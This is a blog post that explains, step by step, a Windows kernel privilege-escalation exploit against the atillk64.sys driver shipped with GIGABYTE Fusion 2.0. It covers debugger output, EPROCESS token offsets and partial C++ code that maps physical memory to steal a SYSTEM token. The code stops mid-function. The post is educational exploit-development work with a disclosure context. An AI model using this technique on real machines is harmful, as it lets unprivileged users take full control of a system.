<!doctype html>
<html lang="en-us">
  <head>
    <title>post1 // In the love of breaking</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.85.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Mahmoud Zohdy" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://MahmoudZohdy.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="post1"/>
<meta name="twitter:description" content="Background I&rsquo;ve been focusing, really since the end of January, on working through the FuzzySecurity exploit development tutorials on the HackSysExtremeVulnerableDriver to try and learn some more about Windows kernel exploitation and have really enjoyed my time a lot.
During this time, @ihack4falafel released some proof-of-concept exploits[1][2] against several Windows kernel-mode drivers. The takeaway from these write-ups, for me, was that 3rd party drivers that are responsible for overclocking, RGB light-management, hardware diagnostics are largely broken."/>

    <meta property="og:title" content="post1" />
<meta property="og:description" content="Background I&rsquo;ve been focusing, really since the end of January, on working through the FuzzySecurity exploit development tutorials on the HackSysExtremeVulnerableDriver to try and learn some more about Windows kernel exploitation and have really enjoyed my time a lot.
During this time, @ihack4falafel released some proof-of-concept exploits[1][2] against several Windows kernel-mode drivers. The takeaway from these write-ups, for me, was that 3rd party drivers that are responsible for overclocking, RGB light-management, hardware diagnostics are largely broken." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://MahmoudZohdy.github.io/posts/post1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-04-25T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-04-25T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://MahmoudZohdy.github.io/"><img class="app-header-avatar" src="https://github.com/MahmoudZohdy/MahmoudZohdy.github.io/raw/main/doc/images/image.png" alt="Mahmoud Zohdy" /></a>
      <h1>In the love of breaking</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
            <br>
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
            <br>
          
          <a class="app-header-menu-item" href="/aboutme/">About</a>
            <br>
          
          <a class="app-header-menu-item" href="/explotation/">explotation</a>
            <br>
          
          <a class="app-header-menu-item" href="/re/">low-level development</a>
            <br>
          
          <a class="app-header-menu-item" href="/re/">Reverse Engineering</a>
            <br>
          
          <a class="app-header-menu-item" href="/wi/">Windows internal</a>
      </nav>
      <p>Reverse Engineering, Windows internal, low-level development, explotation</p>
      <div class="app-header-social">
        
          <a href="https://github.com/MahmoudZohdy" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/mahmoud-zohdy-519328124/" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>My linkedin</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://twitter.com/7odaZohdy" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
          </a>
        
          <a href="mailto:abdelaziz.zohdy@gmail.com" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">post1</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Apr 25, 2020
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          27 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://MahmoudZohdy.github.io/tags/drivers/">Drivers</a>
              <a class="tag" href="https://MahmoudZohdy.github.io/tags/windows/">Windows</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="background">Background</h2>
<p>I&rsquo;ve been focusing, really since the end of January, on working through the <a href="https://www.fuzzysecurity.com/tutorials.html">FuzzySecurity</a> exploit development tutorials on the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSysExtremeVulnerableDriver</a> to try and learn some more about Windows kernel exploitation and have really enjoyed my time a lot.</p>
<p>During this time, <a href="https://twitter.com/ihack4falafel">@ihack4falafel</a> released some proof-of-concept exploits<a href="https://www.activecyber.us/activelabs/viper-rgb-driver-local-privilege-escalation-cve-2019-18845">[1]</a><a href="https://www.activecyber.us/activelabs/corsair-icue-driver-local-privilege-escalation-cve-2020-8808">[2]</a> against several Windows kernel-mode drivers. The takeaway from these write-ups, for me, was that 3rd party drivers that are responsible for overclocking, RGB light-management, hardware diagnostics are largely broken.</p>
<p>The types of vulnerabilities that were disclosed in these write-ups often were related to low-privileged users having the ability to interact with a kernel-mode driver that was able to directly manipulate physical memory, where all kinds of privileged information resides.</p>
<p>The last FuzzySecurity <a href="https://www.fuzzysecurity.com/tutorials/expDev/23.html">Windows Exploit Development Tutorial Series</a> is <a href="https://twitter.com/FuzzySec">b33f&rsquo;s</a> exploit against a Razer driver exploiting this very same type of vulnerability.</p>
<p>Getting more interested in this type of bug, I sought out more write-ups and found some great proof-of-concepts:</p>
<ul>
<li><a href="https://twitter.com/Jackson_T">Jackson T&rsquo;s</a> write-up of an LG driver privilege escalation vulnerability,</li>
<li><a href="http://dronesec.pw/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">hatRiot&rsquo;s</a> write-up of a Dell driver privilege escalation vulnerability, and</li>
<li><a href="http://blog.rewolf.pl/blog/?p=1630">ReWolf&rsquo;s</a> write-up of a few different driver vulnerabilities within the same type of logic bug realm.</li>
</ul>
<p>After reading through those, I decided to just start downloading similar software and searching for drivers that I hadn&rsquo;t seen CVEs for and that had some key APIs. My criteria when searching was that the driver had to:</p>
<ul>
<li>allow low-privileged users to interact with it,</li>
<li>have either an <code>MmMapIoSpace</code> or <code>ZwMapViewOfSection</code> import.</li>
</ul>
<p>As someone who is very new to this type of thing, I figured with the help of the aforementioned walkthroughs, if I was able to find a driver that would allow me to interact with physical memory I could successfully develop an exploit.</p>
<h2 id="disclaimer">Disclaimer</h2>
<p>This is kind of a niche space and as a new person getting into this very specific type of target I wasn&rsquo;t really aware of the best places to look for more information about these types of vulnerable drivers. The first few things I checked was that there were no CVEs for the driver and that the driver hadn&rsquo;t been mentioned on Twitter by security researchers. By the time I had reversed the driver and discovered it to be vulnerable in theory, but without a working exploit, I realized that the driver had been classified as vulnerable by researchers Jesse Michael and Mickey Shkatov at <a href="https://eclypsium.com/2019/08/10/screwed-drivers-signed-sealed-delivered/">Eclypsium</a>. The driver gets a small mention in their <a href="https://github.com/eclypsium/Screwed-Drivers/blob/master/DRIVERS.md">github repo</a> but without specifically identifying the vulnerabilities that exist.</p>
<p><strong>I&rsquo;m not claiming responsibility for finding the vulnerability, since I was far from the first.</strong> Jesse and Mickey were given all of the credit on the CVE application and I can prove this upon request.</p>
<p>I was able to get in contact with <a href="https://twitter.com/jessemichael">Jesse</a> via Twitter and he was extremely charitable with his time. He gave me a great explanation of their interactions with a vendor about the driver.</p>
<p>At this point, since there was no published proof-of-concept, I decided to press on and develop the exploit, which Jesse wholeheartedly supported and encouraged. I figured I&rsquo;d develop an exploit, show AMD the proof-of-concept, and give them 90 days to respond/patch or explain that they&rsquo;re not concerned.</p>
<p>Huge thanks to Jesse for being so charitable. He&rsquo;s also incredibly knowledgeable and was willing to teach me tons of things along the way when answering my questions.</p>
<h2 id="gigabyte-fusion-20">GIGABYTE Fusion 2.0</h2>
<p>One of the first software packages I downloaded was GIGABYTE&rsquo;s <a href="https://www.gigabyte.com/MicroSite/512/rgb2.html">Fusion 2.0</a> software which comes with several drivers. I won&rsquo;t get any more in-depth with the types of drivers included other than the subject of this post, <code>atillk64.sys</code>. Using default installation options,  the driver was installed here: <code>C:\Program Files (x86)\GIGABYTE\RGBFusion\AtiTool\atillk64.sys</code>.</p>
<p>The driver file description states the product name is <code>ATI Diagnostics</code> version <code>5.11.9.0</code> and its copyright is <code>ATI Technologies Inc. 2003</code>.  I&rsquo;m not sure what other software packages out there also install this driver, but I&rsquo;m sure Fusion 2.0 isn&rsquo;t the only one. I&rsquo;ve found that several of these hardware diagnostic/configuration software suites install licensed drivers that are often slightly modified (or not modified at all!) versions of known-to-be vulnerable code-bases like the classic <code>WinIO.sys</code>.</p>
<h2 id="atillk64sys-analysis">atillk64.sys Analysis</h2>
<p>The first thing I needed to know was what types of permissions the driver had and if lower-privileged users could interact with the driver. Looking at the device with <a href="%5Bhttp://www.osronline.com/article.cfm%5Earticle=97.htm%5D(http://www.osronline.com/article.cfm%5Earticle=97.htm)">OSR&rsquo;s devicetree</a>, we can see that this is the case.</p>
<p><img src="/assets/images/AWE/cve1.PNG" alt=""></p>
<p>Reversing the driver was pretty easy even as a complete novice just because it is so small. There is the hardly any surface area to explore and the IOCTL handler routine was pretty straightforward. <code>MmMapIoSpace</code> was one of the imports so I was already interested at this point.</p>
<p>One routine caught my attention early on because the API call chain was very similar to one of the driver routines that @ihack4falafel wrote up a proof-of-concept for.</p>
<p>The routine first calls <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace"><code>MmMapIoSpace</code></a>, which takes a physical address as a parameter and a length (and cache type) and maps that memory into system memory and returns a pointer to the now virtual address that corresponds to the beginning of the physical memory you asked to be mapped. So at this point, this system address is not available to us as a userland process. It is stored in <code>rax</code> and the result is checked to make sure the API call succeeded and did not return <code>NULL</code>.  After some experimentation, as long as we pass a check that our input buffer is <code>0x18</code> in length, we are able to completely control two of the <code>MmMapIoSpace</code> parameters: <code>NumberOfBytes</code> and <code>PhysicalAddress</code>. These values are taken from <code>rdi</code> offsets which is the address of our input buffer. <code>CacheType</code> is hardcoded as <code>0</code>.</p>
<p><img src="/assets/images/AWE/cve2.PNG" alt=""></p>
<p>If the call succeeded, a call is made to <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioallocatemdl"><code>IoAllocateMdl</code></a> with the same values. The virtual address returned by <code>MmMapIoSpace</code> is given as a parameter as well as the same <code>Length</code> value. This API also associates our newly created <code>MDL</code> with an <code>IRP</code>.</p>
<p><img src="/assets/images/AWE/cve3.PNG" alt=""></p>
<p>If the call succeeded, a subsequent call is made to <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmbuildmdlfornonpagedpool"><code>MmBuildMdlForNonPagedPool</code></a> which takes the <code>MDL</code> we just created and &lsquo;updates it to describe the underlying physical pages.&rsquo; MSDN states that <code>IoAllocateMdl</code> doesn&rsquo;t initialize the data array that follows the <code>MDL</code> structure, and that drivers should call <code>MmBuildMdlForNonPagedPool</code> to initialize the array and describe the physical memory in which the buffer resides.</p>
<p>Next, is a call to <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmaplockedpages"><code>MmMapLockedPages</code></a>, which is an old an deprecated API. This call takes the updated <code>MDL</code> and maps the physical pages that are described by it into our process space. It returns the starting address of this mapping to us eventually you&rsquo;ll see as the return value (<code>rax</code>) is eventually placed in <code>rbx</code> and moved to <code>[rdi]</code> which will be our output buffer in <code>DeviceIoControl</code>.</p>
<p>Subsequent API calls to <code>IoFreeMdl</code> and <code>MmUnmapIoSpace</code> perform some cleanup and free up the pool allocations (as far as I know, please correct me if I&rsquo;m wrong).</p>
<p><img src="/assets/images/AWE/cve4.PNG" alt=""></p>
<h2 id="exploitation-strategy">Exploitation Strategy</h2>
<p>The first 8 bytes of our output buffer at this point hold a pointer to the mapped memory in our process space.</p>
<p>Say we mapped <code>0x1000</code> bytes from physical address offset <code>0x100000000</code> all of the data from <code>0x100000000</code> to <code>0x100001000</code> would be available to us within our process space. This is bad because we are a low-privileged process and this data can contain arbitrary system/privileged data.</p>
<p>The strategy for exploiting this was heavily informed by FuzzySec&rsquo;s approach to exploiting his aforementioned Razer driver. At a high-level we are going to:</p>
<ul>
<li>map physical memory into our process space,</li>
<li>parse through the data looking for &ldquo;Proc&rdquo; pool tags,</li>
<li>identify our calling process (typically <code>cmd.exe</code>) and note the <strong>location</strong> of our security token,</li>
<li>identify a process typically running as <code>SYSTEM</code> (something like <code>lsass.exe</code>) and note the <strong>value</strong> of its security token,</li>
<li>and finally, overwrite our token with the <code>SYSTEM</code> process token value to gain <code>nt authority/system</code>.</li>
</ul>
<h2 id="proc-tags-in-the-pool">&ldquo;Proc&rdquo; Tags in the Pool</h2>
<p>Following along with FuzzySec&rsquo;s strategy here, the first thing we need to do is identify what these data structures actually look like in the pool. There will be pool chunk header and then a tag prepended to each pool allocation. The tag we&rsquo;ll be looking for in our mapped memory is &ldquo;Proc&rdquo;, which is <code>0x636f7250</code> as an integer value.</p>
<p>To find some examples, we can use the <code>kd !poolfind &quot;Proc&quot;</code> command to identify pool allocations with our tag.</p>
<p>Looking at the output, we see we started scanning large pool allocations for the tag. I quit the process after 5 minutes or so as this should be enough sample data.</p>
<pre><code>Scanning large pool allocation table for tag 0x636f7250 (Proc) (ffffd48c9d250000 : ffffd48c9d550000)

ffffd48ca040f340 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca10bd380 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca53b83e0 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca21c60b0 : tag Proc, size     0xb70, Nonpaged pool
ffffd48cb36e6410 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca09533b0 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca08c8310 : tag Proc, size     0xb70, Nonpaged pool
ffffd48c9bfd40c0 : tag Proc, size     0xb70, Nonpaged pool
ffffd48c9e59d310 : tag Proc, size     0xb70, Nonpaged pool
ffffd48c9fce0310 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca150f400 : tag Proc, size     0xb70, Nonpaged pool
ffffd48cae7de390 : tag Proc, size     0xb70, Nonpaged pool
ffffd48ca0ddc330 : tag Proc, size     0xb70, Nonpaged pool
</code></pre><p>Just plugging in the first address there in the WinDBG Preview memory pane, we can see that from this address, if we subtract <code>0x10</code> and then add <code>0x4</code>, we see our &ldquo;Proc&rdquo; tag.</p>
<pre><code>kd&gt; da ffffd48ca040f340-0x10+0x4
ffffd48c`a040f334  &quot;Proc8.@...........M&quot;
</code></pre><p><img src="/assets/images/AWE/cve5.PNG" alt=""></p>
<p>So we&rsquo;ve identified a &ldquo;Proc&rdquo; pool allocation and we have a good idea of how they are allocated. As b33f explains, they are all <code>0x10</code> aligned, so every address here ends in a <code>0</code>. We know that at some arbitrary address ending in <code>0</code>, if we look at <code>&lt;address&gt; + 0x4</code> that is where a &ldquo;Proc&rdquo; tag <em>might</em> be.</p>
<p>So the first strategy we&rsquo;ll employ in parsing for data we&rsquo;re interested in, is to start at our mapped address and iterate by <code>0x10</code> each time and checking the value of our address + <code>0x4</code> for &ldquo;Proc&rdquo;.</p>
<p>From here, we can appeal to the <code>EPROCESS</code> structure to find the hardcoded offsets to <code>EPROCESS</code> members we&rsquo;re interested in, which are going to be:</p>
<ul>
<li><code>ImageFileName</code> (the name of the process),</li>
<li><code>UniqueProcessId</code>, and</li>
<li><code>Token</code>.</li>
</ul>
<p>I did all my testing on Windows 10 build 18362 and these were the offsets:</p>
<pre><code>kd&gt; !process 0 0 lsass.exe
PROCESS ffffd48ca64e7180
    SessionId: 0  Cid: 0260    Peb: 63d241d000  ParentCid: 01f0
    DirBase: 1c299b002  ObjectTable: ffffe60f220f2580  HandleCount: 1155.
    Image: lsass.exe

kd&gt; dt nt!_EPROCESS ffffd48ca64e7180 UniqueProcessId Token ImageFilename
   +0x2e8 UniqueProcessId : 0x00000000`00000260 Void
   +0x360 Token           : _EX_FAST_REF
   +0x450 ImageFileName   : [15]  &quot;lsass.exe&quot;
</code></pre><p>So we can see that from the address that would normally be given to us if we did a <code>!poolfind</code> search for &ldquo;Proc&rdquo;, it is</p>
<ul>
<li><code>0x2e8</code> to the <code>UniqueProcessId</code>,</li>
<li><code>0x360</code> to the <code>Token</code>, and</li>
<li><code>0x450</code> to the <code>ImageFileName</code>.</li>
</ul>
<p>So in our minds right now, our allocations look like this (thanks to <a href="http://blog.rewolf.pl/blog/?p=1630">ReWolf</a> for breaking this down so well):</p>
<ul>
<li><code>POOL_HEADER</code> structure (this is where our tag will reside),</li>
<li><code>OBJECT_HEADER_xxx_INFO</code> structures,</li>
<li><code>OBJECT_HEADER</code> which, contains a <code>Body</code> where the <code>EPROCESS</code> structure lives.</li>
</ul>
<p>The problem I found was that process to process, the size of these structures in between our &ldquo;Proc&rdquo; address and the point where our <code>EPROCESS</code> structure begins was wildly varied. Sometimes they were <code>0x20</code> in size, sometimes up to <code>0x90</code> during my testing. So right now my understanding of these allocations looks something like this:</p>
<pre><code>if &lt;0x10-aligned address&gt; + 0x4 == &quot;Proc&quot;

then &lt;0x10-aligned address&gt; + &lt;some intermediate structure size(somewhere between 0x20 and 0x90 typically)&gt; == &lt;beginning of EPROCESS&gt;

then &lt;beginning of EPROCESS&gt; + 0x2e8 == UniqueProcessId
then &lt;beginning of EPROCESS&gt; + 0x360 == Token
then &lt;beginning of EPROCESS&gt; + 0x450 == ImageFileName
</code></pre><p>So my code had to account for these varying, let&rsquo;s just call them &ldquo;headers&rdquo; informally for now,  sizes. I noticed that all of these &ldquo;header&rdquo; structures ended with a 4-byte marker value of <code>0x00B80003</code>. So what my code would now do is,</p>
<ul>
<li>find &ldquo;Proc&rdquo; by looking at <code>0x10-aligned</code> addresses and looking at the 4-byte value at <code>+0x4</code>,</li>
<li>once found, iterate <code>0x10</code> at a time up to offset <code>0xA0</code> (since the largest header size I found was <code>0x90</code>) looking for <code>0x00B80003</code>,</li>
<li>take the location of &ldquo;Proc&rdquo; and add it to a vector,</li>
<li>take the offset to <code>0x00B80003</code> and add it to a vector since we need to know this &ldquo;header&rdquo; size to calculate our way to the <code>EPROCESS</code> members we&rsquo;re interested in.</li>
</ul>
<p>So now that we have both the location of a &ldquo;Proc&rdquo; and the size of the header, we can accurately get <code>UniqueProcessId</code>, <code>Token</code>, and <code>ImageFileName</code> values.</p>
<ul>
<li>(&ldquo;Proc&rdquo; - <code>0x4</code>) + header-size + <code>0x2e8</code> = <code>UniqueProcessId</code>,</li>
<li>(&ldquo;Proc&rdquo; - <code>0x4</code>) + header-size + <code>0x360</code> = <code>Token</code>,</li>
<li>(&ldquo;Proc&rdquo; - <code>0x4</code>) + header-size + <code>0x450</code> = <code>UniqueProcessId</code>.</li>
</ul>
<p>As an example, take this &ldquo;Proc&rdquo; tag found by <code>!poolfind</code>:</p>
<pre><code>FFFFD48C`B102D320  00 00 B8 02 50 72 6F 63 39 B0 0D A6 8C D4 FF FF  ....Proc9.......
FFFFD48C`B102D330  00 10 00 00 88 0A 00 00 48 00 00 00 FF E8 2E F6  ........H.......
FFFFD48C`B102D340  C0 D4 66 2F 05 F8 FF FF 24 F6 FF FF E8 1F F6 FF  ..f/....$.......
FFFFD48C`B102D350  4A 7F 03 00 00 00 00 00 07 00 00 00 00 00 00 00  J...............
FFFFD48C`B102D360  00 00 00 00 00 00 00 00 93 00 08 00 F6 FF FF E8  ................
FFFFD48C`B102D370  C0 D4 66 2F 05 F8 FF FF 6B 85 EE 27 0F E6 FF FF  ..f/....k..'....
FFFFD48C`B102D380  03 00 B8 00 00 00 00 00 A0 04 0D A2 8C D4 FF FF  ................
</code></pre><p>We can see that <code>0xFFFFD48CB102D320</code> - <code>0x4</code> is &ldquo;Proc&rdquo;. Our header marker <code>0x00B80003</code>, denoting when the header ends, is at offset <code>0x60</code> from there. We can test that we can find the <code>ImageFileName</code> given this information as follows:</p>
<pre><code>kd&gt; da 0xFFFFD48CB102D320 + 0x60 + 0x450
ffffd48c`b102d7d0  &quot;svchost.exe&quot;
</code></pre><p>So this looks promising.</p>
<h2 id="implementing-strategy-in-code">Implementing Strategy in Code</h2>
<p>One difficulty I faced on my Windows 10 build was that mapping large chunks at a time with <code>DeviceIoControl</code> calling our driver routine would often result in crashes. I didn&rsquo;t have this problem at all on Windows 7. In my Windows 7 exploit I was able to map a <code>0x4CCCCCCC</code> byte chunk and parse through the entire thing looking for the values I was after.</p>
<p>On Windows 10, I found the most stable approach to be to map <code>0x1000</code> (small page-sized) chunks at a time and then parse through these mapped chunks for my values. If I didn&rsquo;t find my values, I would map another <code>0x1000</code>. This too wasn&rsquo;t crash free. I found that if I made too many mappings I would also crash so I had to find a sweet spot.</p>
<p>I also found that some calls to the driver routine with <code>DeviceIoControl</code> would return a failure. I wasn&rsquo;t able to completely figure this out but my suspicion is that since our <code>CacheType</code> is hardcoded for us with <code>MmMapIoSpace</code>, if we tried to map pages that had been given a different <code>CacheType</code> in a previous mapping to a virtual address, it would fail. (Does this make sense?)</p>
<p>Picking a physical address to start mapping from is kind of arbitrary but I found the sweet spot on my Windows 10 VM to be around <code>0x200000000</code>. This VM has about 8 GB of RAM. To limit the amount of mappings, I set a hard cap at <code>0x240000000</code> so that my exploit would stop mapping once it hit this address. I also toyed around with adding a limit to the amount of times <code>DeviceIoControl</code> is called but the exploit seems stable enough in testing that this wasn&rsquo;t necessary in the end.</p>
<p>I used two main functions, the first function maps memory iteratively looking to identify the <strong>physical</strong> addresses of of &ldquo;Proc&rdquo; tags that have our &ldquo;header marker&rdquo; value soon after. This function stores the address of each physical location, the size of the header offset, and the size of the offset from the beginning of the memory page to the &ldquo;Proc&rdquo; location. It stores all of these values in vectors which are the sole members of a struct which the function returns. The offset to the beginning of the page is simply calculated with a modulus operation and then the remainder is subtracted from the &ldquo;Proc&rdquo; location. I wanted to make sure I was always mapping from a nice <code>0x1000</code> aligned address. Here is some of that snipped code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] Going fishing for 100 </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Proc</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> chunks in RAM...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
    <span style="color:#66d9ef">while</span> (proc_count <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>)
    {
        DWORDLONG num_of_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
        DWORDLONG padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
        INT64 start_address <span style="color:#f92672">=</span> START_ADDRESS <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> iteration);

        INPUT_BUFFER input_buff <span style="color:#f92672">=</span> { start_address, num_of_bytes, padding };

        <span style="color:#66d9ef">if</span> (input_buff.start_address <span style="color:#f92672">&gt;</span> MAX_ADDRESS)
        {
            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Max address reached!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Iterations: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> iteration <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
            exit(<span style="color:#ae81ff">1</span>);
        }
        <span style="color:#66d9ef">if</span> (DeviceIoControl(
            device_handle,
            IOCTL,
            <span style="color:#f92672">&amp;</span>input_buff,
            <span style="color:#66d9ef">sizeof</span>(input_buff),
            output_buff,
            <span style="color:#66d9ef">sizeof</span>(output_buff),
            <span style="color:#f92672">&amp;</span>bytes_returned,
            NULL))
        {
            <span style="color:#75715e">// The virtual address in our process space where RAM was mapped
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// is located in the first 8 bytes of our output_buff.
</span><span style="color:#75715e"></span>            INT64 mapped_address <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)output_buff;

            <span style="color:#75715e">// We will read a 32 bit value at offset i + 0x100 at some point
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// when looking for 0x00B80003, so we can&#39;t iterate any further
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// than offset 0xF00 here or we&#39;ll get an access violation.
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">for</span> (INT64 i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0xF10</span>); i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)
            {
                INT64 test_address <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span> i;
                INT32 test_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT32)(test_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
                <span style="color:#66d9ef">if</span> (test_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x636f7250</span>)   <span style="color:#75715e">// &#34;Proc&#34;
</span><span style="color:#75715e"></span>                {
                    <span style="color:#66d9ef">for</span> (INT64 x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; x <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0x100</span>); x <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)
                    {
                        INT64 header_address <span style="color:#f92672">=</span> test_address <span style="color:#f92672">+</span> x;
                        INT32 header_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT32)header_address;
                        <span style="color:#66d9ef">if</span> (header_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00B80003</span>) <span style="color:#75715e">//  &#34;Header&#34; ending
</span><span style="color:#75715e"></span>                        {
                            <span style="color:#75715e">// We found a &#34;header&#34;, this is a legit &#34;Proc&#34;
</span><span style="color:#75715e"></span>                            proc_count<span style="color:#f92672">++</span>;

                            <span style="color:#75715e">// This is the literal physical mem addr for the
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// &#34;Proc&#34; pool tag
</span><span style="color:#75715e"></span>                            INT64 temp_addr <span style="color:#f92672">=</span> input_buff.start_address <span style="color:#f92672">+</span> i;
                            
                            <span style="color:#75715e">// This address might not be page-aligned to 0x1000
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// so find out how far off from a multiple of 
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// 0x1000 we are. This value is stored in our 
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// PROC_DATA struct in the page_entry_offset
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// member.
